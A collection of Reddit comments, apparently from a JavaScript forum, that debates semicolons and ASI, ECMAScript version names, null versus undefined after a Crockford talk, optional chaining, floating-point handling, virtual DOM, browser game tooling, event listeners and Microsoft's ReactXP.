But that's not ES7 :) ES7, aka ES2016, is just the two features I mentioned. ES2017 has async/await. When in doubt, trust the word of the all-knowing /u/rauschma : http://2ality.com/2016/01/ecmascript-2016.html vs http://2ality.com/2016/02/ecmascript-2017.html .
As someone who absolutely loves *not* writing semicolons, you are correct. If we were to choose with the current state of JavaScript, semicolons would be the way to go. As you simply cannot write all code without them. That being said, I would actually prefer we just improve ASI rules so we don't need them at all...
&gt; At university the teachers would push a specific norms and they had a script running on your files at examination. Every little mistake, like wrong identation, more than 80 char per line, etc, would reduce points. When you see people ending with negative scores, It kinda helps doing without formatter after. Why would you spend the time to do that by hand if some tool magically did it for you perfectly every time? I have trouble convincing the old folk at my office of this. It is like they validate their existence by pressing keys on a keyboards instead of shipping software. &gt; I don't really see your point, I need js for what I do, I can't really use anything else... ? Before the mid-90s JavaScript didn't exist... and yet business was still conducted. To say your JavaScript skills cannot be replaced with something else, or that your skills didn't replace something else, is exceedingly myopic.
I know :) semi by design and semi by, i just didn't do it yet... Note that one of the tips say that the palette will sometimes change, it doesn't (yet anyway). 
Just make an executable node app. 
&gt; If you need them 1% of the time, then you need them 100% of the time. Nope, linters handle the 1%, as well as the 100%. You shouldn't have to worry about style guides, that should be handled for you, as with `prettier`. Other languages enforce a style as with `elm-format`, among others. &gt; Javascript should enforce them Obviously if you can improve the next version of JavaScript, it's far better to make semis completely unnecessary even in weird cases (as in most modern languages), than to throw a syntax error if they weren't there.
No thank you, I'd rather fail early.
@acemarke is correct, ES7 only ended up including two things. My usage of the term ES7 is not meant to be accurate and is mostly just so the number of chapters (7) correspond to the title. Confusion about what ES6, ES7, ES8 etc specifically refers to comes up a ton, even contributors to compilers like Babel get tripped up all the time. Several prominent JS humans think it is best not to use the terms ES6/ES7/ES8 and instead refer specifically to the name of the specs, i.e ECMAScript 2015. Could be helpful but imho we would all still get confused just with more accurate terms. That said, I'll definitely be changing things based on feedback.
What do you mean? I'm personally sick of having to do things like this: obj &amp;&amp; obj.a &amp;&amp; obj.a.b
Ok weird seems removing the firebug-lite.js the guy was using actually corrects the problem.
I feel weird not having semicolons... Particularly so in situations like chaining methods or methods where Paramus span multiple lines. Though I really like the idea of a "no configuration" standard style guide. The style guide we use at work only differs slightly from AirBnB's ES6/JSX guide, but it still took me a lot of time to define and document.
&gt; Nope, linters handle the 1%, as well as the 100% The point is that you have to get the team to agree on that. Some teams don't want any semis, some teams always want semis. The point is you shouldn't even have discussions like that (or like this one). There should be no option.
I was lucky to be the first engineering hire where I'm at. When setting up boilerplate I just grabbed a sane ESLint config preset and haven't looked back.
So just remember the semi colon when you write iifes, problem solved..?
TIL lodash devs are iconoclasts.
Unfortunately this is very true... A lot of people jumping into web development start on a framework boilerplate and learn the tools instead of the conventions used to build those tools.
Oh, sick! Wasn't expecting it to be that simple. Thanks!
You know when you watch a film and a character does something really cringeworthy and embarrassing, and you become embarrassed just by watching it? I'm that.
Try lodash's get method.
I feel the same way. I think code looks cleaner and reads easier with semicolons, but I'll follow whatever convention the team wants.
On second thought I'm not sure any of the past few comments make sense here, because the error that is most likely to arise here is that one of these properties is `undefined`, not `null`. With that understanding I do see Crockford's point, but I don't know if this change would be generally useful for plowing through deep property accesses without doing any checking for existence ‚Äî which I still think is a bad idea.
0.1 + 0.2 === 0.3 returns false ..thats new to me actually :) ..and I never wondered what will 0/0 return :)
I hope you understand how important is declarative rendering. If not, try to reimplement this simple example[1] in imperative vanillajs style and beat even average vdom implementations. So now the question is why choose vdom over fine-grained observables(KVO) when building declarative rendering solution. First of all, when you consider all edge cases that you need to solve for KVO, it becomes so complex, that in the end it is usually significantly slower because of complexity. Another problem is that KVO requires building dependency graph when you create DOM trees, and destroy it when you remove DOM trees. Creating and removing DOM trees are usually the slowest operations and KVO just makes them even slower, partial updates on the other hand are fast and it won't make any difference if you reduce 2ms updates to 1ms, you'll get zero frame drops even if you do slightly more work with vdom. Applications that are using vdom are usually using libraries like redux for coarse-grained observing, so you only observe values where it actually matters for update performance. Anothing thing that most developers don't understand is that the only common thing between DOM and Virtual DOM is that they both use tree data structure, that is all. Virtual DOM is just a bad term that is used to describe algorithm that mutates scene graph(DOM) when transitioning from "immutable" state "a" to state "b". Those who are trying to use DOM nodes as immutable state to solve this problem usually don't understand what they are doing, and I'd strongly suggest to avoid everything that those people are saying :) P.S. I've been working on vdom algorithms for quite some time [2], [3]. And know a little bit about performance [4] 1. https://github.com/localvoid/uibench-react/blob/master/js/fc.jsx 2. https://github.com/localvoid/kivi/ 3. https://github.com/ivijs/ivi/ 4. https://rawgit.com/krausest/js-framework-benchmark/master/webdriver-ts/table.html
I noticed with my young devs stucked on particular bugs the easiest way to get them to fix the bug is to ask them to strip everything that is not necesssary and try to have the most readable code. Usually by the time they finished cleaning things, the bug is gone. And the code is way easier to maintain as it is minimal (fast to read, fast to patch).
Not having semicolons (much like omitting optional curly braces) only adds an extra cognitive load for people (including yourself in future) who have to look through your code. In a language where whitespace in inconsequential, terminator characters help humans to **explicitly** tell where a statement has ended. Without it, you'd have to rely on other people being disciplined with their policy of using newlines. Do I only use them to indicate the end of a statement, like a semicolon? Do I not use them to break up a particularly long statement that could otherwise have been written in one line [e.g: absurdlyLongFunctionName(absurdlyLongArgument1, absurdlyLongArgument2) * absurdlyLongArgument3 ] ? What about template strings? And even if **you** adopt a consistent newline policy and are extremely strict with enforcing it, you can't expect everyone else to. It's easier just to say "stick a semicolon to the end of your statements".
Isn't ES7 support lacking at the moment ? Not even sure people are using ES6 correctly yet.
They allow indentation that fits every developer's width preference. I used to be someone who liked 4-wide indent-sizes. I always knew most people prefer to view their indentation 2-wide, which is why I always respected their preference and used a variable-width tab character so that they can read files just as easy as I can.
German has a word for that (because of course it does): fremdsch√§men. https://en.wiktionary.org/wiki/fremdsch%C3%A4men
Sure, there is a difference between null and undefined, but it is a meaningful one? If it would be, wouldn't have newer languages copied this second null-ish value? You really don't need two of those "billion dollar mistake" values. Also, if your parameters are optional, give them a default value. Then everyone can see that they are optional by looking at the function's signature.
Yeah, that's a good point.
Agreed. I didn't agree with everything he had to raise. But it was a very interesting talk all the same.
Except that's exactly what we deal with in JavaScript today. It's very common to see bizarre chains of logic to drill down into an object. Crap like: `if (path &amp;&amp; path.to &amp;&amp; path.to.some &amp;&amp; path.to.some.key) { ... }`. Changing null to a self-referencing immutable object doesn't "introduce" the problem you're describing--it already exists.
I'm saying it inverts the problem. Instead of having to carefully traverse the object to make sure it has the full property chain, if that access returns `null`, now I have to (at least often) carefully traverse the object to find out which part was missing.
Yeah, that seems more commonly useful than the deep property chain case. I still feel, though, that the whole story here, to make it work, needs to be that you're happy to treat the non-existence of the object the same as you'd treat the non-existence of the object's property in terms of how you'd react to the null response. Having a separate syntax (goofy though it may be) seems reasonable to me, because then you can voluntarily opt-in when that is indeed your use case.
I don't think there's really a need in an explicit undefined. It's also like the ' and " situation, it's better to just decide on one imo, and in javascript it should be undefined
I watched this talk with an open mind, but I really disagree with a lot of things this guy had to say. His primary supporting argument for almost every topic was "Doing things this way will make everything better". Obviously there's some merit to some of it (i.e. Floating point math being inherently broken), but for the most part it kind of felt like he was just saying "Programming should be written in plain text with curly braces. Somebody should make this language with all my ideas, and the things I liked about FORTRAN because I don't feel like it's my responsibility". 
You are not the only one, but One of those should not exist. And the other one, that should not exist either. 
He's arguing that there are reasons to have 1 "bottom value", but that null and undefined shouldn't both exist simultaneously in a language.
What are you doing where you would often need to traverse backwards in that situation and why does the change necessitate you doing anything differently than what you would do now? If it's important for you to check every step of the class chain, there's literally no change to how you would approach that problem.
Check SystemJS
`Uncaught ReferenceError: send is not defined`
try `require.ensure` or the newer`import()` syntax with a transpiler. Moving / spliting it to a common chunks would also work, depending on how coupled your routing is with the JS. Otherwise, do it manually with something like this: https://github.com/ivancuric/js-utils/blob/master/utils.js#L5
It's supported in every major current browser version, and there comes a point where you should really cut your loses when it comes to backwards compatibility, cutting edge technology has its price. 
The man has a point. Though it's smarter to go to caniuse, make sure you have the right geography selected and ask yourself if you can really do without x potential visitors. (E.g.: There are billions in the third world but they aren't going to spend a dime on your site and will likely only be takers and not givers in general).
Can we just stop calling it ES7? The official name is ES2016, you're only adding to the confusion.
I feel Crockford has got a pretty sober attitude to FP. Trying to stay pure and use composability where it makes sense is great. Dismissing all instances of imperative code as garbage is foolish. I feel a lot of the "FP proponents" are in the later category.
I think he simply wants to start a discussion for a future language in the correct direction. Let's use Stallman as an example. Following his opinions strictly is not possible in the real world. However his clever arguments created a huge movement towards free software. Crockford doesn't want to design a new language, he just wants to influence the conversation around language design.
Yes. I do it all the time. [Here's a presentation I did in 2014 on the basics](http://ericlathrop.com/2014/11/making-javascript-games/). [See some of my games here.](http://twoscoopgames.com/)
I see your point. ATM I'm not going to do some crazy stuff. I just want to get the hang of how to create a simple game from like idea to publishing. Thanks for the quick answer;) 
Thank you:)
I like it, but am having trouble figuring out how to highlight certain countries and de-emphasize others.
&gt; In the case of spaces vs tabs, you cannot possibly eliminate spaces completely from your code, but you can completely eliminate tabs. So it makes sense to go with spaces because then you've simplified 2 things into 1 without sacrificing anything in exchange. Funny way to argue. https://en.wikipedia.org/wiki/Digraphs_and_trigraphs You cannot possibly eliminate '&lt;', '&gt;', ':', and '%' from your code, but you can eliminate '[', ']', '{', '}', and '#'. So it makes sense to use digraphs for some reason. Also, you can of course completely eliminate spaces if you wanted to. "var&lt;tab&gt;x" works just fine.
You don't _need_ white space or reasonably named variables either, but high quality code use them for a reason. 
You surely can, but it's more fun with TypeScript and Dart, because they offer much better tooling. I wrote some platformers, puzzle games, and shoot'em ups in Java, JS, AS3, TS, and Dart. I preferred AS3 over ES3/5 and do prefer TS/Dart over ES6+. Even with really simple games you quickly reach a point where JS' sub par tooling becomes annoying. Phaser (a popular JS game engine) is shipped with type definitions for TS. You could check that one out. I really liked Seth Ladd's talk from a couple of years ago. It was a really good introduction to making games with the Canvas API and requestAnimationFrame. Unfortunately, it's a bit dated. I wish someone would do a more recent reincarnation of that talk without the workarounds and with ES6+.
This is mostly the right answer to treating Floating Point problems safely, always try to deal with a domain in its smallest unit as an Integer. Like money, $.23, is just 23 cents. Or time, Dates are usually always down to the millisecond. https://www.quora.com/How-do-software-systems-in-financial-sector-deal-with-floating-point-arithmetic &gt; We keep, and calculate, client balances to 1/1000th of a penny internally, but only display complete pennies. I believe some in the banking industry also use higher precision floats, like quadruple-precision (128-bit).
I really like the way C# handles this now. I don't know if any other language did this fist but I suspect it came from somewhere already using it. Instead of your &amp;&amp; syntax, you simply use a ?. Too find the property or method and it returns null if something along the way didn't exist or is null. Obj?.a?.b Then test if that's null before using it. 
Hey, thanks for advice! So I will check out Phaser for sure:) What game engine/place did you make those games? Are there any tutorials I can look at to learn about that?
So does Elm. It's great
Ok thanks:)
He seems like a douche.
&gt; I also noticed quite some criticism on his ideology and that he's teaching his students with false information (e.g. Composition vs. Inheritance article). Can you link, I wanted to give a quick take on this. All I found was this: [Common Misconceptions About Inheritance in JavaScript](https://medium.com/javascript-scene/common-misconceptions-about-inheritance-in-javascript-d5d9bab29b0a) ... where he says: &gt; Aren‚Äôt classical inheritance and prototypal inheritance really the same thing, just a stylistic preference? No. Classical and prototypal inheritance are fundamentally and semantically distinct. Then he proceeds to split hairs details of the inheritance implementations of JavaScript and languages like Java. I definitely feel that's not a productive, pragmatic stance, but I can't say it's "wrong" per se. It's an opinionated rant, like many industry "gurus" like to have (say like Bob Martin, who coined SOLID and so on). 
Sorry if this is another stupid question, but I'm trying to do a really simple program but have no idea why this isn't working. &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; body { background-color: #c98498; color: #472d35; } &lt;/style&gt; &lt;script&gt; /* Enter paragraph */ var paragraph = "When I first brought my cat home from the humane society she was a mangy, pitiful animal. It cost a lot to adopt her: forty dollars. And then I had to buy litter, a litterbox, food, and dishes for her to eat out of. Two days after she came home with me she got taken to the pound by the animal warden. There's a leash law for cats in Fort Collins. If they're not in your yard they have to be on a leash. Anyway, my cat is my best friend. I'm glad I got her. She sleeps under the covers with me when it's cold. Sometimes she meows a lot in the middle of the night and wakes me up, though."; var word = paragraph.split(' '); var counter = 0; function goThroughArray() { document.getElementById("text").innerHTML = word[counter]; counter++; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p id="text" onload="setInterval(goThroughArray, 200)"&gt;&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; I'm trying to have it so it prints one word of the paragraph at a time but my .innerHTML = word[counter] is never called?
I believe he was arguing that we abandon having two things to represent nothing, so null and undefined would be the same thing. Then he was explaining how it would work (by having an imitable object representing null/undefined that would return itself).
 I didn't get it ;)
Yeah but this is just bad code. If you need a random block of void returning lexical scope provided by an iffe, you're doing something wrong.
I would reject a PR that contained return { foo: bar } regardless of whether we used semi-colons or not. I use semi-colons in TS and not in JS, but a lot of the arguments against ASI seem to be easily solved by using any kind of code style. Like another example that people use fnCall() [1,2,3].forEach(x =&gt; x) is also clearly bad style -- don't use array literals solely to cause side effects.
[removed]
Hi /u/funJS, it looks like you're new to reddit, welcome! Thanks for the submissions, but please make sure you read http://www.reddit.com/rules and our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `syntaxsuccess.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [syntaxsuccess.com](/search?q=%28and+site%3A%27syntaxsuccess.com%27+author%3A%27funJS%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;syntax=cloudsearch&amp;feature=legacy_search)|16|100%
And the reason for semi colons is what?
If you're not using React, I would just go with `addEventListener` instead of doing something like `onClick="foo()"` simply due to the fact that your HTML probably isn't split into smaller components and having a mix of JS calls in your `.js` and `.html` file might be unorganized and could be a bit of a pain. I would just keep all your JS inside a `.js` file, and do something like this, which allows you to have multiple click listeners as opposed to just one when you do an `onClick` attribute.: var button = document.querySelector('#my-btn'); button.addEventListener('click', function() { // Do something on click }); button.addEventListener('click', function() { // Do another thing on click }); Of course if your style works for you, I don't think there is anything inherently wrong with that approach (maybe others could weigh in on that).
It was working working well and then chrome ran out of memory haha
Yea the lodash versions are actually because of swagger-js, and they are supposed to update that soon to just use one version of lodash. But the part about the size of the react-dom part, how can I verify that it truly is compressed? When I check my bundle.min.js it looks all minified to me?
Check out ‚Äú[HTML5 Games Workshop: Make a platformer game with JavaScript!](https://hacks.mozilla.org/2017/04/html5-games-workshop-make-a-platformer-game-with-javascript/)‚Äù by Bel√©n Albeza.
It's not a good practice to use js/style on your html elements, very ease you will get into problems, maintainability and much more + it bloats your html and make harder to read. Better separate js, css and html into different files or you can use inside html file using the script/style tag.
Probably what everyone is looking for: &gt; How does ReactXP differ from React Native for Web? &gt; &gt; React Native for Web is an open-sourced library developed by engineers at Twitter. We started implementing ReactXP before React Native for Web was available. &gt; &gt; The goals behind these two efforts are similar, but the approaches differ. ReactXP is a layer that sits on top of React Native and React, whereas React Native for Web is a parallel implementation of React Native ‚Äî a sibling to React Native for iOS and Android. https://microsoft.github.io/reactxp/docs/faq.html
You would have to reject the PR regardless of semi-colons because adding them does not make the code correct. ASI will still insert semi-colons in the "wrong" place and the code doesn't execute the way that it reads. Additionally, I can't imagine this code would pass linting or testing, but these are advanced concepts used by professionals or serious amateurs.
Don't follow the tutorials if they don't work in their own examples. 
No, you saying fewer API docs automatically equals easier to learn is what's easy to discredit. You can try and swing it any way you want, but the fact of the matter is there are piles of people coming from React to Vue because while the surface area of the API in its entirety is bigger, the architectural decisions are clearly more sensible from a developer happiness and comprehension standpoint. 
Most all local database solutions are simply wrappers for IndexedDB, WebSQL, and localStorage (in that order usually). You can always learn the native APIs, or go with something that's a fairly simple wrapper (like LocalForage) all the way to more complex solutions like PouchDB as you mentioned. If you just need a simple solution I'd go with localForage.
Like the idea; wish they'd have chosen [a slightly better name](http://i.imgur.com/bs1ftgt.jpg/bliss.bmp)
That was the best practice but not so much anymore. negative side effects are none, until they are! (i explain further in my original response) - there is nothing wrong with putting the js and css in your html until you get to the point to where you need it. Premature optimization is a bad thing, and over-engineering is a bad practice. Once your project grows into something else, your constraints change, and then it might make more sense to move the code into script tags. I'm not saying its a good practice to always use onClick, but I dont think its a bad practice 100% of the time. The best approach is to learn how to solve problems in as many ways as possible. This way, you solve problems like this with patterns that fit the problem and introduce the minimal amount of complexity to the code base as possible. In my experience, I've been bitten by needless complexity and over engineering more than by anything else, and if you only know one way to solve a problem, you will run into bigger problems. You should never try to code for problems that "may happen", your imagination will get the best of you :) The most maintainable codebases are the ones with minimal complexity. So dont add code for something that does not need it but "might" later. You're going to have to refactor it again anyway when you add new features, so better to add the complexity when it actually makes sense. 
&gt; But the part about the size of the react-dom part, how can I verify that it truly is compressed? When I check my bundle.min.js it looks all minified to me? If you can't see a lot of lines in the `.min.js` file then it should definitely be minified. I'm not sure about the CLI version, but if you generate a HTML report with either `new BundleAnalyzerPlugin({ ... analyzerMode: 'server' ...` or `new BundleAnalyzerPlugin({ ... analyzerMode: 'static' ...` it should show the different sizes in a better way.
I think this is perfectly valid. And exactly why I am learning purescript instead of continuing to shim the functional paradigm into JavaScript.
I had no idea this operator existed in a language actually. It is currently a stage 1 proposal to be added to ECMAScript!
Oh I am excite. 
Fair enough. That being said, I'd argue you should convert it to a named function anyways. function foo() {} foo() Same means without the breakage. 
Even assuming this is true, I would still choose clarity / lack of ambiguity over pure readability. 
Yeah, although IIFEs still have value, albeit much less now with modules. The same applies to all kinds of syntax constructs, for example you also need to do ;[1,2,4].filter.... 
&gt; the double quote has a specific meaning in English, it functionally quotes someone or something So do single quotes. I'm guessing you don't read much. &gt; The single quote however is overloaded because it's primary function is as an apostrophe. In ASCII, not in English.
&gt;Proposing DEC64 was a non-starter when he first did it. Why is Dec64 a nonstarter? When I first got into programming it seemed like the way errors can crop into float type calculations should be the non-starter. I've grudgingly tolerated it, but would love to see that go away. Since you are objecting to his 0*n idea because it is fundamentally wrong, well then floating point errors should be rejected for being fundamentally wrong too. 
Thank you for this
Does query selector work for classes to? I always see document.getelementbyid used and haven't used queryselector because I've lived in jquery for so long
Hi excite, nice to meet you.
querySelectorAll('.someclass &gt; .somechild .descendant') returns an array of html elements If you have been living in jquery world for so long, you might find this site extremely helpful: http://youmightnotneedjquery.com/
Yep. What this guy said. 
Depends how much do you want for it? 
Thank you :) 
Hello dad
With small projects I usually call JS functions within my HTML as OP suggests mainly because it's easier to read at first glance. e.g. if I read a piece of HTML that goes: &lt;button onClick="foo()"&gt;Derp&lt;/button&gt; then I immediately know that if I click that button it calls a function called foo() and I can go search for that in my (single) JS file if I need to refresh my memory. I suppose the same argument could be said for specifically naming elements with unique IDs to make searching easier.
He lost me with the float changes. Then proposal he makes is almost reasonable for a javascript replacement, but is a horrible idea for a general purpose language. His approach is an order of magnitude slower and has not undergone anywhere near the degree of thought and review that IEEE floating point has. This suggestion is unbelievably naive and undercuts his otherwise sensible suggestions.
&gt; Its supported in every major current browser version It's supported by Firefox and Chrome/Opera. It's not yet supported by Edge and Safari. http://caniuse.com/#feat=wasm
I've never considered safari or edge/ie to be a major browser personally, and they both support them in experimental editions so its definitely not far off, edge a bit longer because of Microsofts shit turn around.
I think the speed is fine (0.75x is too slow, and even 1.25x was OK), but there is a bit of a slur and your intonation, emphasis, and pauses are all over the place. Slowing down the video during playback only makes the small issues seem worse to my ears, but slowing down your actual speech could help with both. It mostly seems to get better after a few minutes, so maybe you just need some warm-up before recording.
Yea I am trying to remove myself from jquery and go with raw JS or vanilla...so anything helps!
Saw the URL and thought that for some crazy reason Microsoft had partnered with ReactOS to help deliver full Windows XP compatibility, or something.
Is.. Is that you? 
What exactly does it clarify? AFAIK, they are only /necessary/ for separating IIFE's from one another during file concatenation and code minification. Unless you are writing a bunch of IIFE's on the same line, I don't see how this is an issue of clarity.
Do you have any idea what I could do to solve the issue on Chrome?
"The Skype team at.." ...aaannnd we're done here. Move along.
Also NPMjs has no semi colons.
Not sure I completely follow, say we have the following: bar.py class Foo(object): __init__(self): self.__bar = 'bar' baz.py from .bar import Foo as FooBar class Foo(FooBar) __init__(self): super(ItemClient, self).__init__() self.__bar = 'baz' Should it be the case that there are two variants of `__bar`, but instead the bug is we've overridden the parent `__bar` unknowingly? 
Coulda been ReactVista, man
If we can achieve something in 2 ways and one of them leads to better performance, we should probably choose that way. The factory method you mentioned is a bit simpler, but the **accessor pattern** is also pretty simple. Your method will work and will be fast enough in most cases, but if we really care about the best performance, or if we don't know what will happen to our code, how much it'll scale, then we should probably use the platform that provides a more performant way to avoid refactoring code in the future.
Nice! Is there include react flux course? 
Ah, I originally had it there and it didn't work. Realized it was because the paragraph had to be before the script. 
No, because '&lt;', '&gt;', ':' and '%' are overloaded so it makes sense to use other symbols for blocking etc. This is the same argument he makes for using " for strings instead of ', because ' is already used as an apostrophe. 
HTML ignores new line characters. As for `&lt;br&gt;` being rendered as text, this looks like Angular (not 100% sure, never used it), and if it's anything like React I'd imagine they don't render the strings as HTML. React has a way to explicitly pass HTML, I'm sure this does as well, you just have to find it.
&gt; But if you're actually spending more time using those objects ... then my approach will have better performance It's likely the case. Perhaps I should run some tests to see if property lookup will take much longer. Another factor is memory, and quite obviously, it takes less memory to store the prototype than re-creating properties / methods using factory function. &gt; Modifying them is quite trivial to do in your case As I mentioned in the bottom of the article, if you don't want your property to be modified, you can use `Object.defineProperty` to make `this._` non-configurable / non-writable. Perhaps once `Reflect` becomes more supported, you can use `Reflect.defineProperty`, which will be even more secure. &gt; There's a simpler way to solve the collision problem, and that's by simulating sort-of Symbols Sure, if you find it simpler, go ahead and use it. To me, it looks a bit ugly and seems like a workaround rather than a solution. &gt; This is not true private properties, but then again, neither is the accessor pattern Accessor pattern does provide true private properties, unlike your example. There's no way to access them outside of the closure, without having the *key*. Also, I'm not sure your solution is very future-proof. In case of Symbols, you can use `Object.getOwnPropertySymbols` to access private properties, so Symbols are not too great at storing private properties anyway. And yeah, even if using your solution is faster and simpler, it's a trade-off for having true privacy and inability of your user to mess up your code.
Could have been React Mobile 2017 Pro for Web: Browser Edition
&gt; Also, I'm not sure your solution is very future-proof. In case of Symbols, you can use Object.getOwnPropertySymbols to access private properties, so Symbols are not too great at storing private properties anyway. I saw this (and other points) you're making in the article, but you also have to be pragmatic. Let's say I'm using Symbol keys to store a few private properties and methods. Technically users have access to them. But they actually don't know which one stands for what. This lack of knowledge makes breaking encapsulating by enumerating Symbol keys completely impractical. Additionally, as we're kind of half-saying this entire time, the goal of encapsulation isn't to absolutely forbid knowledge and access to something, there are two goals: - Private namespace, so no collisions occur with public access, or child class members (symbols: check). - Putting enough of a boundary, so breaking the encapsulation of object can't be done by accident, and is not very practical by intent (symbols: check). When you encapsulate objects that run in the same codebase as the "hostile code" which you're hiding details from, getting into hairy schemes to hide data at all cost is unreasonable. It's after all the same codebase, running on the same domain, same sandbox, same process. Perfect impenetrable 100% security between objects is not possible, and not needed. After all, even in Java, C# and so on you can just use Reflection and unravel any object you want. 
That would be a really non-deterministic operation, since there's no guarantee at all that your little bit of code was the last bit running in the VM to attempt a property access.
What about a course in cooking lasagna? I hope it has one of those.
You have to use ngBindHtml for binding html, so you'll be able to use `&lt;br&gt;`, otherwise it will be treated as text, and for text inside html elements, the browsers automatically remove line breaks, unless it's inside a `&lt;pre&gt;` tag. From your other comment there, you could just put the br before the closing `&lt;/th&gt;`? I'm farily sure that whatever you're trying to accomplish isn't the best/standard way to do it, so you should take a step back and rethink it. But if you are sure that's what you want, check out ngBindHtml (iirc you'll have to add it as a dependency in your module) directive or use `&lt;pre&gt;`element
You don't know where it breaks with `if (path &amp;&amp; path.to &amp;&amp; path.to.some &amp;&amp; path.to.some.key) { ... }` either, though.
Here is my gulpfile if you are interested: https://pastebin.com/BBitU2ZR
i think it's a good idea. and that's the reason why put id attribute, while in react or vuejs, it's not recommanded.
I use Dexie and can recommend it. 
I remember a huge clusterfuck when ES6 came out, he wrote an article where he talked about classes but did not seem to understand it though he was praising some design patterns over others. Reddit was lit :) Overall I think he spends too much time promoting his stuff rather than contributing over things that would matter.
When you change the css from absolute to fixed it will change the position of the button, try adding more styles to the css of the button to make it consistent (height, width, left, right). It's probably also worth making the 10720 pixels dynamic (based on the height of the page), so if you change the content of your page it will still work. Do a google as to how to detect when an element is visible on the page, and add the class then. 
I really like this. 
I prefer faster speaking tutors. Actually, I prefer really, really fast paced tutorials with speakers who speak very fast and cover large grounds at break neck speeds, not catering to newbies or people who need lots of repetitions.
Chitpotle please.
I can see it in your i's
Would be great for students.
Watched a bunch of these over the last couple of hours, I've found them very informative. Thanks very much!
in the link you sent open dev panel (chrome F12) and paste it should change the html content 
Yeai wouldn't send XML to your backend from your front end. It would probably be a lot easier to just send JSON, then have your backend construct XML from that. Really all you need is one endpoint to accept your JSON, deserialize into an object or directly into XML (I'm certain such libraries exist depending on your backend language). How much experience do you have with JS? What's your backend written in, and what languages/programming styles are you comfortable with? My personal favorite framework is react, but it's basically a pure Javascript option (even html is actually disguised js in react). 
Thanks, I have spent years writing in Java, C#, CPP, Python. The frontend/backend integration is easy (JSON/XML conversions, etc.) I don't worry about those at all. My main issue is presenting these XML or JSON configurations in a series of human facing forms that make sense and don't look ugly. 
and the Ultimate MSDN version where you in addition get a pallet of DVDs every month containing all GitHub projects ever released...
it is your move to make the offer.
So it's like Electron without higher resource usage due to running embedded in Chromium?
For reference: http://djcordhose.github.io/flow-vs-typescript/elm-flow-typescript.html#/ Quoting what I wrote [previously](https://www.reddit.com/r/javascript/comments/63cang/true_when_debugging_your_javascript_d/): &gt; I use TypeScript as well as Flow. I now spend a significant amount of time working on the type system instead of the problem itself. I also have filed numerous bug reports to both TS and Flow (as well as for my IDE, about 2-3 (good and reproducible) bug reports every week, for the last 2 years since I started using this IDE in earnest). &gt; Don't get me wrong, I deliberately chose to use a type system and will continue to do so, but just looking at the looooong list of open issues in both tools (in detail, to see what kinds of issues people run into) should give you a feeling for how hard it is to put a 3rd party type system on top of Javascript. &gt; TypeScript (or Flow) is no panacea! For example, you cannot code any way you like. To make type inferences the type tools only recognize *some* of the many possible code constructs. For example, if you have an array of (union) `type1` and `type2` you have to use `if` or a `switch` statement and string literals (or a variable with a string literal), you cannot `array.filter` for the desired type. The type system also occasionally forces you to add type checking code that you *know* you don't need. Not because there can never be an error (everything that can happen will happen), but because you know that that particular kind of error is something that testing should catch during development, and you don't want to burden your *runtime code base* (often you have errors where letting it crash instead of handling the problem is far more desirable, and the type system forces you to explicitly add an extra `if` and a `throw`).
Softpedia?
There are some libraries. But it all depends on what you are looking for. I was looking into the same. I wanted to find a library that could sync. Did not find one (except [PouchDB](http://pouchdb.com/) that only syncs with CouchDB), but as we know JS is a fast changing field. So for learning (not working) you could look directly into IndexedDB and LocalStorage. I used https://github.com/Irrelon/ForerunnerDB. It uses a MongoDB API, but diverges in some aspects. There is [LevelDB](http://leveldb.org/), [Goolge Lovefield](https://google.github.io/lovefield/) and [Gun](https://github.com/amark/gun). Lovefield looks interesting because it uses a SQL-like syntax. It is long ago the last time I checked it. Maybe it is more mature now. Gun looks interesting because it is a graph database.
I beg to disagree. They have explained their reasons (which seem very reasonable) and given ample notice to anybody who's using their CDN. As of today you have 20 days to change a line of HTML (script link) to another one. 
Well said, when you put it that way, I'm less inclined to keep it in the HTML page. This just highlights the necessity to weigh the costs, and in the case of 30 seconds, I can't disagree. 
&gt; I'm imagining there has to be a framework that would allow me to define different views and relationships between them Try to look into one of theese (they are quite ready-made), possibly TodoApp done with them - react+redux - angular - vue.js &gt; which would serialize/deserialize into that XML which I can send to my backend code In every js framework/library, you have some forms (set of inputs/select/components) which are send to server. Best picks are use either - native html form POST format - json format everything else needs some more code on your part (or library). particulary XML - do you really need xml? &gt; I'm imagining there has to be a framework that would allow me to define different views and relationships between them, which would serialize/deserialize into that XML If you want framework, which lets you define view in XML, and frontend will render it according server instructions... you probably dont want javascript framework (=interactivity) but server side rendering (jsp, ...). Probably you dont need javascript framerowork but some big corporate CMS.
Its based on react-native. Similar to react-native-web actually, where you can write one app and run it everywhere. These apps are running natively, not in a wrapped web-view like in Electron. 
If `x.y.z` evaluates to `undefined` type, it's the logical answer regardless of where in the chain undefined was encountered. Why would you refer to a deeper property if you actually care about a property further up the chain? Of course it needs to throw an error in JavaScript and we need more syntax, existing behaviour can't really be changed, but he was talking about an entirely different language. A different language could just give you the correct value instead of an error.
Wow this looks amazing! I've been a backend web developer for years, and every time I need to do something in JS is painful, pretty much guess work, I need to change that.
Well, all common "js frameworks" are about "i write my frontend views in some js" not "i define my views by XML". Are you certain you need single page application? (= rich interactive) Your case seems more like "i want to generate my html on server". And some standard xslt transformations to forms are available for that languages It seems you want to do your programming on server anyway (xml definitions). So you dont need "frontend framework" but "frontend interpreter of your XML". And i think, not much of this exists, because nobody is doing it today in frontend land
Good point.
If you do something like: button.onclick = function() { ... } then you are limited to only having one `onClick` listener to that button. So if you tried to have 2 distinct click handlers: button.onclick = function() { // Do something on click } button.onclick = function() { // Do something else on click } the first one would get overwritten. This wouldn't be the case if you use `addEventListener`.
To be fair; I was listening to a podcast recently with a microsoft dev that works on c++ technical specs/docs and eems likely internally microsoft (at least dev-wise) has been pushing more to listen to community, open source projects, etc - Historically and from a sales perspective presently, they've made a lot of decisions that upset their consumer base and developer community. So in short, cool to see this type of wrapper around react-native + react, but since it's Microsoft most of us will hold our breath to see if/how they butcher this opportunity; I was actually just starting to teach myself how to build this tool for deployment and development at our company (one-source code to rule them all sort of approach) and having an open source project that I can refer to and that has already solved a lot of common issues is great.
I wonder if you aren't on board with the current type system offerings you could catch most if with unit testing? Check the types coming in as parameters and make sure functions output the correct types?
Of course you could, it's just a lot more verbose, more error-prone, and adds runtime overhead.
